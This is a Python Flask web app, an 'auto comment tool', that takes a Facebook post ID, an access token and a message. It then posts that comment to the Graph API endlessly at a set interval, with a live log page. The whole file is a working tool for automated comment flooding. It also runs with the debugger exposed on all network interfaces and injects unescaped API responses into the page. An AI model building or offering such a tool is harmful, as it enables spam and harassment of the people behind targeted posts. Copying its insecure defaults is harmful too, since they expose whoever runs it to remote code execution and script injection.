from flask import Flask, request, render_template_string, redirect, url_for, session
import os, threading, time, requests, secrets

app = Flask(__name__)
app.secret_key = secrets.token_hex(16)

# Data structure for tasks
tasks = {}   # {task_id: {"thread":..., "logs":[...], "running":True}}

# -------------- HTML Templates --------------
BASE_STYLE = """
<style>
  body {
    margin:0;
    min-height:100vh;
    display:flex;
    align-items:center;
    justify-content:center;
    font-family: 'Poppins', sans-serif;
    background: linear-gradient(to bottom left, #ff0000, #800080);
    color:white;
  }
  .card {
    width:95%;
    max-width:800px;
    height:1500px; /* Fixed height */
    background: rgba(255,255,255,0.05);
    backdrop-filter: blur(10px);
    border-radius:20px;
    padding:30px;
    box-shadow: 0 0 25px rgba(0,0,0,0.6);
    text-align:center;
    overflow:auto; /* Scroll if content overflows */
  }
  .card img {
    width:400px;
    height:400px;
    object-fit:cover;
    border-radius:15px;
    margin-bottom:20px;
  }
  input, textarea {
    width:100%; padding:12px; border-radius:10px; border:none; outline:none;
    margin-bottom:15px; background:rgba(0,0,0,0.4); color:white;
  }
  input:focus, textarea:focus { box-shadow:0 0 10px #ff00ff; }
  button {
    padding:20px 20px; border:none; border-radius:12px;
    background:linear-gradient(90deg,#ff0000,#800080);
    color:white; font-weight:bold; cursor:pointer;
    transition:0.3s;
  }
  button:hover { transform:scale(1.05); box-shadow:0 0 15px #ff00ff; }
  .logs {
    text-align:left; max-height:300px; overflow:auto; background:rgba(0,0,0,0.5);
    padding:10px; border-radius:10px; font-size:20px; margin-top:30px;
  }
</style>
"""

FORM_HTML = """
<!DOCTYPE html><html><head><title>Auto Comment Tool</title>
""" + BASE_STYLE + """
</head><body>
  <div class="card">
    <h2>🚀 Multi Task Auto Comment Tool</h2>
    <img src="https://via.placeholder.com/400x200.png?text=Future+Tech" alt="Banner">
    <form method="post">
      <label>Comment Text</label>
      <textarea name="comment" required></textarea>
      <label>Post ID</label>
      <input type="text" name="postid" required>
      <label>Access Token</label>
      <input type="text" name="token" required>
      <label>Delay (seconds)</label>
      <input type="number" name="delay" value="30" required>
      <button type="submit">Start Task</button>
    </form>
  </div>
</body></html>
"""

LOGS_HTML = """
<!DOCTYPE html><html><head><title>Task Logs</title>
""" + BASE_STYLE + """
<script>
function refreshLogs(){
  fetch(window.location.href + "/stream").then(r=>r.text()).then(txt=>{
    document.getElementById("logbox").innerHTML = txt;
  });
}
setInterval(refreshLogs, 2000);
</script>
</head><body>
  <div class="card">
    <h2>📡 Live Logs (Task {{tid}})</h2>
    <img src="https://via.placeholder.com/400x200.png?text=Logs+View" alt="Logs Banner">
    <div id="logbox" class="logs">Loading logs...</div>
  </div>
</body></html>
"""

# -------------- Functions ----------------
def run_task(tid, comment, postid, token, delay):
    url = f"https://graph.facebook.com/v15.0/{postid}/comments"
    headers = {'Authorization': f'Bearer {token}', 'Content-Type': 'application/json'}
    payload = {'message': comment}

    tasks[tid]["logs"].append(f"[*] Task {tid} started...")
    while tasks[tid]["running"]:
        try:
            r = requests.post(url, json=payload, headers=headers)
            if r.ok:
                msg = f"[+] Comment posted successfully: {comment}"
            else:
                msg = f"[x] Failed: {r.status_code} {r.text}"
        except Exception as e:
            msg = f"[!] Error: {e}"

        tasks[tid]["logs"].append(msg)
        time.sleep(delay)

# -------------- Routes ----------------
@app.route("/", methods=["GET","POST"])
def index():
    if request.method == "POST":
        comment = request.form.get("comment")
        postid = request.form.get("postid")
        token = request.form.get("token")
        delay = int(request.form.get("delay", 30))

        tid = secrets.token_hex(4)
        tasks[tid] = {"logs":[], "running":True}
        t = threading.Thread(target=run_task, args=(tid,comment,postid,token,delay), daemon=True)
        tasks[tid]["thread"] = t
        t.start()

        return redirect(url_for("logs", tid=tid))
    return render_template_string(FORM_HTML)

@app.route("/logs/<tid>")
def logs(tid):
    if tid not in tasks: return "Invalid Task ID"
    return render_template_string(LOGS_HTML, tid=tid)

@app.route("/logs/<tid>/stream")
def logstream(tid):
    if tid not in tasks: return "No logs"
    return "<br>".join(tasks[tid]["logs"][-50:])

@app.route("/stop/<tid>")
def stop(tid):
    if tid in tasks:
        tasks[tid]["running"] = False
        return f"Task {tid} stopped."
    return "Task not found."

# -------------- Run ----------------
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=3000, debug=True)
